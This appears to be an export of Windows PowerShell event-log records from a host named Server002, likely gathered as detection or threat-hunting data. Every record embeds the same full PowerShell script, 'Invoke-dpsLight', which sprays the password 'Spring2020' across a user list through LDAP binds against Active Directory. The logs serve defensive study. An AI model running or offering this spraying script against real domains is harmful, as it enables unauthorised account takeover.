{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:51.4836349"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:51.5010799"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:51.5010799"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:51.5010799"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:51.5181720"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:51.5181720"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:51.7598766"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=ce13330f-441b-47c0-b9a1-83e8c56a197c\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:59:58.7116422"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f1803fb5-20d7-43a9-8d53-4116c3d18709\r\n\tHostApplication=powershell.exe &amp; {function Invoke-dpsLight ($Password, $userlist) {\r\n$users = Get-Content $userlist\r\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\r\nforeach ($User in $users) {\r\n $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\r\n if ($Domain_check.name -ne $null) {\r\n Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\r\n }\r\n else { Write-Host \". \" -NoNewline}\r\n}\r\nWrite-Host -ForegroundColor green \"Finished\"\r\n}\r\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=ce13330f-441b-47c0-b9a1-83e8c56a197c\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
